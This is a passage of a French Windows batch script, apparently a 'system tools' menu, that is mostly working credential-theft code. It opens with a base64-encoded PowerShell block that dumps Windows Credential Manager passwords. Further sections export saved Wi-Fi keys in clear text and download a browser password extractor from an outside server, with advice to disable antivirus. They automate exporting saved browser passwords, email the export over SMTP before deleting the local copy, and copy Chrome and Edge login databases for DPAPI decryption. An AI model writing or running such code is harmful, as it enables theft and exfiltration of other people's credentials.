powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand QQBkAGQALQBUAHkAcABlACAAQAAiAA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBDAG8AbABsAGUAYwB0AGkAbwBuAHMALgBHAGUAbgBlAHIAaQBjADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAEMAcgBlAGQATQBhAG4AIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGEAZAB2AGEAcABpADMAMgAuAGQAbABsACIALAAgAEUAbgB0AHIAeQBQAG8AaQBuAHQAPQAiAEMAcgBlAGQARQBuAHUAbQBlAHIAYQB0AGUAVwAiACwAIABDAGgAYQByAFMAZQB0AD0AQwBoAGEAcgBTAGUAdAAuAFUAbgBpAGMAbwBkAGUALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByAD0AdAByAHUAZQApAF0ADQAKACAAIAAgACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABDAHIAZQBkAEUAbgB1AG0AZQByAGEAdABlACgAcwB0AHIAaQBuAGcAIABmAGkAbAB0AGUAcgAsACAAaQBuAHQAIABmAGwAYQBnAHMALAAgAG8AdQB0ACAAaQBuAHQAIABjAG8AdQBuAHQALAAgAG8AdQB0ACAASQBuAHQAUAB0AHIAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGEAZAB2AGEAcABpADMAMgAuAGQAbABsACIALAAgAEUAbgB0AHIAeQBQAG8AaQBuAHQAPQAiAEMAcgBlAGQARgByAGUAZQAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgA9AHQAcgB1AGUAKQBdAA0ACgAgACAAIAAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIAB2AG8AaQBkACAAQwByAGUAZABGAHIAZQBlACgASQBuAHQAUAB0AHIAIABjAHIAZQBkACkAOwANAAoADQAKACAAIAAgACAAWwBTAHQAcgB1AGMAdABMAGEAeQBvAHUAdAAoAEwAYQB5AG8AdQB0AEsAaQBuAGQALgBTAGUAcQB1AGUAbgB0AGkAYQBsACwAIABDAGgAYQByAFMAZQB0AD0AQwBoAGEAcgBTAGUAdAAuAFUAbgBpAGMAbwBkAGUAKQBdAA0ACgAgACAAIAAgAHMAdAByAHUAYwB0ACAAQwBSAEUARABFAE4AVABJAEEATAAgAHsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAARgBsAGEAZwBzADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAAVAB5AHAAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAcgBpAG4AZwAgAFQAYQByAGcAZQB0AE4AYQBtAGUAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AHIAaQBuAGcAIABDAG8AbQBtAGUAbgB0ADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4AQwBvAG0AVAB5AHAAZQBzAC4ARgBJAEwARQBUAEkATQBFACAATABhAHMAdABXAHIAaQB0AHQAZQBuADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAAQwByAGUAZABlAG4AdABpAGEAbABCAGwAbwBiAFMAaQB6AGUAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABDAHIAZQBkAGUAbgB0AGkAYQBsAEIAbABvAGIAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAaQBuAHQAIABQAGUAcgBzAGkAcwB0ADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAAQQB0AHQAcgBpAGIAdQB0AGUAQwBvAHUAbgB0ADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAQQB0AHQAcgBpAGIAdQB0AGUAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAcgBpAG4AZwAgAFQAYQByAGcAZQB0AEEAbABpAGEAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAcgBpAG4AZwAgAFUAcwBlAHIATgBhAG0AZQA7AA0ACgAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABMAGkAcwB0ADwAcwB0AHIAaQBuAGcAWwBdAD4AIABHAGUAdABBAGwAbAAoACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdAAgAD0AIABuAGUAdwAgAEwAaQBzAHQAPABzAHQAcgBpAG4AZwBbAF0APgAoACkAOwANAAoAIAAgACAAIAAgACAAIAAgAGkAbgB0ACAAYwBvAHUAbgB0ACAAPQAgADAAOwANAAoAIAAgACAAIAAgACAAIAAgAEkAbgB0AFAAdAByACAAcABDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAASQBuAHQAUAB0AHIALgBaAGUAcgBvADsADQAKACAAIAAgACAAIAAgACAAIABiAG8AbwBsACAAbwBrACAAPQAgAEMAcgBlAGQARQBuAHUAbQBlAHIAYQB0AGUAKABuAHUAbABsACwAIAAwACwAIABvAHUAdAAgAGMAbwB1AG4AdAAsACAAbwB1AHQAIABwAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwApADsADQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACEAbwBrACkAIAByAGUAdAB1AHIAbgAgAHIAZQBzAHUAbAB0ADsADQAKACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgBbAF0AIABwAHQAcgBzACAAPQAgAG4AZQB3ACAASQBuAHQAUAB0AHIAWwBjAG8AdQBuAHQAXQA7AA0ACgAgACAAIAAgACAAIAAgACAATQBhAHIAcwBoAGEAbAAuAEMAbwBwAHkAKABwAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAsACAAcAB0AHIAcwAsACAAMAAsACAAYwBvAHUAbgB0ACkAOwANAAoAIAAgACAAIAAgACAAIAAgAGYAbwByAGUAYQBjAGgAIAAoAHYAYQByACAAcAB0AHIAIABpAG4AIABwAHQAcgBzACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGMAcgBlAGQAIAA9ACAAKABDAFIARQBEAEUATgBUAEkAQQBMACkATQBhAHIAcwBoAGEAbAAuAFAAdAByAFQAbwBTAHQAcgB1AGMAdAB1AHIAZQAoAHAAdAByACwAIAB0AHkAcABlAG8AZgAoAEMAUgBFAEQARQBOAFQASQBBAEwAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAdAByAGkAbgBnACAAcABhAHMAcwAgAD0AIAAiACIAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAByAHkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAYwByAGUAZAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQgBsAG8AYgBTAGkAegBlACAAPgAgADAAIAAmACYAIABjAHIAZQBkAC4AQwByAGUAZABlAG4AdABpAGEAbABCAGwAbwBiACAAIQA9ACAASQBuAHQAUAB0AHIALgBaAGUAcgBvACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAGEAcwBzACAAPQAgAE0AYQByAHMAaABhAGwALgBQAHQAcgBUAG8AUwB0AHIAaQBuAGcAVQBuAGkAKABjAHIAZQBkAC4AQwByAGUAZABlAG4AdABpAGEAbABCAGwAbwBiACwAIABjAHIAZQBkAC4AQwByAGUAZABlAG4AdABpAGEAbABCAGwAbwBiAFMAaQB6AGUAIAAvACAAMgApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7AH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHIAZQBzAHUAbAB0AC4AQQBkAGQAKABuAGUAdwAgAHMAdAByAGkAbgBnAFsAXQAgAHsAIABjAHIAZQBkAC4AVABhAHIAZwBlAHQATgBhAG0AZQAgAD8APwAgACIAIgAsACAAYwByAGUAZAAuAFUAcwBlAHIATgBhAG0AZQAgAD8APwAgACIAIgAsACAAcABhAHMAcwAgAD8APwAgACIAIgAgAH0AKQA7AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAEMAcgBlAGQARgByAGUAZQAoAHAAQwByAGUAZABlAG4AdABpAGEAbABzACkAOwANAAoAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAcgBlAHMAdQBsAHQAOwANAAoAIAAgACAAIAB9AA0ACgB9AA0ACgAiAEAADQAKAA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiAA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAgACAAPQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAEMAeQBhAG4ADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIAAgACAAIABDAFIARQBEAEUATgBUAEkAQQBMACAATQBBAE4AQQBHAEUAUgAgAC0AIABFAFgAVABSAEEAQwBUAEkATwBOACAAVwBJAE4ARABPAFcAUwAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAEMAeQBhAG4ADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIAA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9ACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAAQwB5AGEAbgANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgANAAoADQAKACQAYwByAGUAZABzACAAPQAgAFsAQwByAGUAZABNAGEAbgBdADoAOgBHAGUAdABBAGwAbAAoACkADQAKAGkAZgAgACgAJABjAHIAZQBkAHMALgBDAG8AdQBuAHQAIAAtAGUAcQAgADAAKQAgAHsADQAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgAFsAIQBdACAAQQB1AGMAdQBuACAAYwByAGUAZABlAG4AdABpAGEAbAAgAHQAcgBvAHUAdgBlACAAbwB1ACAAYQBjAGMAZQBzACAAcgBlAGYAdQBzAGUALgAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAFIAZQBkAA0ACgB9ACAAZQBsAHMAZQAgAHsADQAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgACQAKAAkAGMAcgBlAGQAcwAuAEMAbwB1AG4AdAApACAAYwByAGUAZABlAG4AdABpAGEAbAAoAHMAKQAgAHQAcgBvAHUAdgBlACgAcwApADoAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABHAHIAZQBlAG4ADQAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgANAAoAIAAgACAAIABmAG8AcgBlAGEAYwBoACAAKAAkAGMAIABpAG4AIAAkAGMAcgBlAGQAcwApACAAewANAAoAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIABbACsAXQAgAEMAaQBiAGwAZQAgACAAIAAgACAAIAAgACAAOgAgACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAAWQBlAGwAbABvAHcAIAAtAE4AbwBOAGUAdwBsAGkAbgBlADsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAJABjAFsAMABdAA0ACgAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgACAAIAAgACAAVQB0AGkAbABpAHMAYQB0AGUAdQByACAAIAA6ACAAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABZAGUAbABsAG8AdwAgAC0ATgBvAE4AZQB3AGwAaQBuAGUAOwAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAkAGMAWwAxAF0ADQAKACAAIAAgACAAIAAgACAAIAAkAHAAYQBzAHMAIAA9ACAAJABjAFsAMgBdAA0ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAHAAYQBzAHMAIAAtAG4AZQAgACIAIgApACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgACAAIAAgACAATQBvAHQAIABkAGUAIABwAGEAcwBzAGUAIAAgADoAIAAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAFkAZQBsAGwAbwB3ACAALQBOAG8ATgBlAHcAbABpAG4AZQA7ACAAVwByAGkAdABlAC0ASABvAHMAdAAgACQAcABhAHMAcwAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABHAHIAZQBlAG4ADQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIAAgACAAIAAgAE0AbwB0ACAAZABlACAAcABhAHMAcwBlACAAIAA6ACAAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABZAGUAbABsAG8AdwAgAC0ATgBvAE4AZQB3AGwAaQBuAGUAOwAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACgAbgBvAG4AIABhAGMAYwBlAHMAcwBpAGIAbABlACAALwAgAGMAaABpAGYAZgByAGUAIABzAHkAcwB0AGUAbQBlACkAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABEAGEAcgBrAEcAcgBhAHkADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgACAAIAAgACAALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0AIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABEAGEAcgBrAEcAcgBhAHkADQAKACAAIAAgACAAfQANAAoAfQANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgAD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0AIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABDAHkAYQBuAA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAgACAAWwBOAE8AVABFAF0AIABMAGUAcwAgAG0AbwB0AHMAIABkAGUAIABwAGEAcwBzAGUAIABwAHIAbwB0AGUAZwBlAHMAIAAoAGMAbwBtAHAAdABlAHMAIABNAGkAYwByAG8AcwBvAGYAdAAsACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAARABhAHIAawBHAHIAYQB5AA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAgACAAIAAgACAAIAAgACAAIABjAGUAcgB0AGkAZgBpAGMAYQB0AHMAKQAgAG4AZQAgAHMAJwBhAGYAZgBpAGMAaABlAG4AdAAgAHAAYQBzACAAZQBuACAAYwBsAGEAaQByAC4AIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABEAGEAcgBrAEcAcgBhAHkADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIAA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9ACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAAQwB5AGEAbgANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgANAAoA
echo.
echo --- FIN DE L'EXTRACTION ---
echo.
pause
goto system_tools

:dump_wifi
set "opts=Afficher les mots de passe Wi-Fi a l'ecran;Sauvegarder dans un dossier au choix (Boite de dialogue)"
call :DynamicMenu "MOTS DE PASSE WI-FI (WLAN NETSH)" "%opts%"
set "wifi_choice=%errorlevel%"

if "%wifi_choice%"=="1" goto wifi_view
if "%wifi_choice%"=="2" goto wifi_report
if "%wifi_choice%"=="0" goto system_tools
goto dump_wifi

:wifi_view
cls
echo [OPERATION] Affichage des mots de passe Wi-Fi locaux...
echo.
setlocal enabledelayedexpansion
for /f "tokens=2 delims=:" %%I in ('netsh wlan show profiles ^| findstr /C:"Profil Tous" /C:"All User Profile"') do (
    set "ssid=%%I"
    set "ssid=!ssid:~1!"
    if not "!ssid!"=="" (
        set "pwd="
        for /f "tokens=2 delims=:" %%K in ('netsh wlan show profile name^="!ssid!" key^=clear ^| findstr /C:"Contenu de la cl" /C:"Key Content"') do (
            set "pwd=%%K"
        )
        set "pwd=!pwd:~1!"
        if "!pwd!"=="" set "pwd=(Aucun / Ouvert)"
        echo Reseau SSID : !ssid!
        echo Mot de pass : !pwd!
        echo ------------------------------------------
    )
)
endlocal
echo.
pause
goto dump_wifi

:wifi_report
cls
setlocal enabledelayedexpansion
echo.
echo  ================================================
echo   SAUVEGARDE DES MOTS DE PASSE WI-FI
echo  ================================================
echo.
echo  [*] Selectionnez le dossier de sauvegarde a la souris...
set "FBD_PS=%TEMP%\fbd_%RANDOM%.ps1"
> "%FBD_PS%" echo Add-Type -AssemblyName System.Windows.Forms
>> "%FBD_PS%" echo $f = New-Object System.Windows.Forms.FolderBrowserDialog
>> "%FBD_PS%" echo $f.Description = "Selectionnez le dossier ou enregistrer les mots de passe Wi-Fi"
>> "%FBD_PS%" echo $f.ShowNewFolderButton = $true
>> "%FBD_PS%" echo if ($f.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK) { Write-Output $f.SelectedPath }
set "SEL_FOLDER="
for /f "usebackq delims=" %%D in (`powershell -NoProfile -ExecutionPolicy Bypass -File "%FBD_PS%"`) do set "SEL_FOLDER=%%D"
if exist "%FBD_PS%" del /f /q "%FBD_PS%" 2>nul

if not defined SEL_FOLDER (
    echo  [!] Sauvegarde annulee par l'utilisateur.
    timeout /t 2 >nul
    endlocal
    goto dump_wifi
)

set "TS=%DATE:~-4%%DATE:~3,2%%DATE:~0,2%_%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%"
set "TS=%TS: =0%"
set "TARGET_DIR=%SEL_FOLDER%\Sauvegarde_MotsDePasse_Wifi_%TS%"
mkdir "!TARGET_DIR!" 2>nul

set "OUTPUT=!TARGET_DIR!\Mots_de_passe_WiFi.txt"
echo  [*] Extraction des mots de passe en cours...
> "!OUTPUT!" echo ===============================================
>> "!OUTPUT!" echo   INVENTAIRE MOTS DE PASSE WI-FI - %COMPUTERNAME%
>> "!OUTPUT!" echo   Date : %DATE% %TIME%
>> "!OUTPUT!" echo ===============================================
>> "!OUTPUT!" echo.
for /f "tokens=2 delims=:" %%I in ('netsh wlan show profiles ^| findstr /C:"Profil Tous" /C:"All User Profile"') do (
    set "ssid=%%I"
    set "ssid=!ssid:~1!"
    if not "!ssid!"=="" (
        set "pwd="
        for /f "tokens=2 delims=:" %%K in ('netsh wlan show profile name^="!ssid!" key^=clear ^| findstr /C:"Contenu de la cl" /C:"Key Content"') do (
            set "pwd=%%K"
        )
        set "pwd=!pwd:~1!"
        if "!pwd!"=="" set "pwd=(Aucun / Ouvert)"
        >> "!OUTPUT!" echo SSID : !ssid!
        >> "!OUTPUT!" echo MDP  : !pwd!
        >> "!OUTPUT!" echo -----------------------------------------------
    )
)
netsh wlan export profile key=clear folder="!TARGET_DIR!" >nul 2>&1

echo.
echo  [SUCCES] Mots de passe et profils XML exportes dans :
echo  !TARGET_DIR!
echo.
start "" "!TARGET_DIR!"
pause
endlocal
goto dump_wifi

:sys_nirsoft_pw
cls
setlocal EnableDelayedExpansion
color 0A
echo ===============================================
echo   Extracteur de mots de passe (Nirsoft)
echo ===============================================
echo.
echo  [i] Cet outil utilise WebBrowserPassView pour recuperer
echo      les identifiants enregistres dans vos navigateurs.
echo.
echo  [!] ATTENTION : Les antivirus (Windows Defender, etc.)
echo      bloquent souvent cet outil car il revele des mots de passe.
echo      Si l'outil se ferme seul, desactivez temporairement votre protection.
echo.

set "WBPV=%SCRIPT_DIR%\WebBrowserPassView.exe"
set "DOWNLOAD_URL=https://script.salutalex.fr/scripts/nirsoft/batch/WebBrowserPassView.exe"

REM Verifier credentials pour le mail
set "NIR_MAIL_OK=1"
if not defined SMTP_USER set "NIR_MAIL_OK=0"
if not defined SMTP_PASS set "NIR_MAIL_OK=0"

if "%NIR_MAIL_OK%"=="0" (
    echo  [!] Parametres SMTP non configures dans credentials.txt.
    echo      Le mode Mail sera indisponible.
    echo.
)

REM Telecharger si absent
if not exist "%WBPV%" (
    echo Telechargement de l'utilitaire depuis le serveur...
    curl.exe -fL --retry 3 --retry-delay 2 -o "%WBPV%" "%DOWNLOAD_URL%" 2>nul || certutil -urlcache -split -f "%DOWNLOAD_URL%" "%WBPV%" >nul 2>&1
    if not exist "%WBPV%" (
        echo [!] ERREUR : Impossible de telecharger WebBrowserPassView.
        echo     Verifiez votre connexion internet ou votre Antivirus.
        pause
        endlocal
        goto system_tools
    )
    timeout /t 1 /nobreak >nul
)

REM Menu de mode d'utilisation
set "opts=Automatique : Sauvegarde Locale~Genere un fichier .txt dans le dossier du script;Automatique : Envoi par Mail~Exporte par email et supprime les traces;Manuel : Ouvrir l'Interface GUI~Lance l'outil graphiquement sans l'automatiser"
call :DynamicMenu "MODE D'UTILISATION - NIRSOFT" "%opts%"
set "nir_choice=%errorlevel%"

if "%nir_choice%"=="0" endlocal & goto system_tools
if "%nir_choice%"=="1" set "NIR_MODE=AUTO_LOCAL"
if "%nir_choice%"=="2" (
    if "%NIR_MAIL_OK%"=="0" (
        echo [!] Erreur : Configuration mail absente.
        pause
        goto sys_nirsoft_pw
    )
    set "NIR_MODE=AUTO_MAIL"
)
if "%nir_choice%"=="3" set "NIR_MODE=MANUAL"

if "!NIR_MODE!"=="MANUAL" (
    echo.
    echo Lancement de WebBrowserPassView...
    start "" "%WBPV%"
    echo.
    echo [i] L'utilitaire est ouvert. Faites vos operations manuellement.
    echo     Le script attend que vous fermiez l'utilitaire pour nettoyer.
    echo.
    :wait_nirsoft
    tasklist /FI "IMAGENAME eq WebBrowserPassView.exe" 2>nul | find /I "WebBrowserPassView.exe" >nul
    if %errorlevel% equ 0 (
        timeout /t 2 /nobreak >nul
        goto wait_nirsoft
    )
    goto nirsoft_cleanup
)

REM --- MODE AUTOMATIQUE ---
:nirsoft_auto_flow
echo.
set "custom_filename="
set /p custom_filename="Nom pour le fichier d'export (ex: mes_passes) : "
if "%custom_filename%"=="" goto nirsoft_auto_flow
set "OUTPUT_FILE=%SCRIPT_DIR%\!custom_filename!.txt"

echo.
echo [1/3] Demarrage de l'utilitaire...
if exist "%SCRIPT_DIR%\WebBrowserPassView.cfg" del /F /Q "%SCRIPT_DIR%\WebBrowserPassView.cfg" >nul 2>&1
start "" "%WBPV%"

echo [2/3] Extraction des donnees (Automation)...
timeout /t 5 /nobreak >nul

REM Utilisation de PowerShell pour l'automatisation Ctrl+A, Ctrl+S
powershell -Command "$o='!OUTPUT_FILE!'; Set-Clipboard -Value $o; $wsh=New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')){ Start-Sleep -Milliseconds 500; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 300; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 1500; $wsh.SendKeys('^v'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('{ENTER}'); Start-Sleep -Milliseconds 1000 } else { Write-Warning 'Fenetre Nirsoft non detectee. Antivirus ?' }"

echo [3/3] Fermeture et nettoyage...
taskkill /F /IM WebBrowserPassView.exe >nul 2>&1

if not exist "!OUTPUT_FILE!" (
    echo.
    echo [!] ERREUR : Le fichier d'export n'a pas ete genere.
    echo     Il est possible que l'Antivirus ait bloque l'extraction.
    pause
    goto nirsoft_cleanup
)

REM Filtrage du contenu pour rendre le texte lisible
powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='!OUTPUT_FILE!'; if(Test-Path $f){ $lines=Get-Content $f -Encoding UTF8 -ErrorAction SilentlyContinue; $out=@(); $url=''; $user=''; $pass=''; foreach($l in $lines){ if($l -match '^={10,}'){ if($url -or $user -or $pass){ $out+='================================================'; if($url){$out+='URL      : '+$url}; if($user){$out+='Username : '+$user}; if($pass){$out+='Password : '+$pass}; $out+='================================================'; $out+='' }; $url=''; $user=''; $pass='' } elseif($l -match '^URL\s+:\s*(.*)'){ $url=$matches[1].Trim() } elseif($l -match '^User Name\s+:\s*(.*)'){ $user=$matches[1].Trim() } elseif($l -match '^Password\s+:\s*(.*)'){ $pass=$matches[1].Trim() } }; if($url -or $user -or $pass){ $out+='================================================'; if($url){$out+='URL      : '+$url}; if($user){$out+='Username : '+$user}; if($pass){$out+='Password : '+$pass}; $out+='================================================' }; $out | Set-Content $f -Encoding UTF8 }"

if "!NIR_MODE!"=="AUTO_MAIL" (
    echo Envoi de l'export par mail (!SMTP_USER!)...
    powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $p=ConvertTo-SecureString '%SMTP_PASS%' -AsPlainText -Force; $c=New-Object System.Management.Automation.PSCredential('%SMTP_USER%',$p); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $c -From '%SMTP_USER%' -To '%EMAIL_TO%' -Subject 'Export Nirsoft - !custom_filename!' -Body 'Ci-joint l export de mots de passe.' -Attachments '!OUTPUT_FILE!'" >nul 2>&1
    if %errorlevel% equ 0 (
        echo [OK] Mail envoye.
        del /F /Q "!OUTPUT_FILE!" >nul 2>&1
    ) else (
        echo [!] Echec de l'envoi mail. Fichier conserve localement.
    )
) else (
    echo [OK] Export termine : !OUTPUT_FILE!
)

pause

:nirsoft_cleanup
if exist "%WBPV%" del /F /Q "%WBPV%" >nul 2>&1
if exist "%SCRIPT_DIR%\WebBrowserPassView.cfg" del /F /Q "%SCRIPT_DIR%\WebBrowserPassView.cfg" >nul 2>&1
endlocal
goto system_tools

:: ===============================================
:: Copie locale des donnees navigateurs (SQLite)
:: ===============================================
:dump_browser_local
setlocal enabledelayedexpansion
cls
echo.
echo  +--------------------------------------------------+
echo  ^|        EXTRACTION DES IDENTIFIANTS              ^|
echo  ^|     Chrome / Edge  -  Dechiffrement DPAPI       ^|
echo  +--------------------------------------------------+
echo.
set "CHROME_WAS_OPEN=0" & set "EDGE_WAS_OPEN=0"
tasklist /FI "IMAGENAME eq chrome.exe" 2>nul | find /I "chrome.exe" >nul && set "CHROME_WAS_OPEN=1"
tasklist /FI "IMAGENAME eq msedge.exe" 2>nul | find /I "msedge.exe" >nul && set "EDGE_WAS_OPEN=1"
taskkill /F /IM chrome.exe >nul 2>&1
taskkill /F /IM msedge.exe >nul 2>&1
timeout /t 1 /nobreak >nul

set "OUTDIR=%SCRIPT_DIR%\DiagNav"

:: Générer et exécuter le script PS1 (règle CLAUDE.md : PS > 3 lignes -> fichier temp)
set "DBL_PS=%TEMP%\diag_browser_%RANDOM%.ps1"

> "%DBL_PS%" echo $out = "%OUTDIR%"
>> "%DBL_PS%" echo $browsers = @(
>> "%DBL_PS%" echo   @{Name='Chrome'; Base="$env:LOCALAPPDATA\Google\Chrome\User Data"; Proc='chrome'},
>> "%DBL_PS%" echo   @{Name='Edge';   Base="$env:LOCALAPPDATA\Microsoft\Edge\User Data"; Proc='msedge'}
>> "%DBL_PS%" echo )
>> "%DBL_PS%" echo $profileFiles = @('Login Data','Web Data')
>> "%DBL_PS%" echo $copied = 0
>> "%DBL_PS%" echo function TryCopy($src, $dst, $proc) {
>> "%DBL_PS%" echo   try {
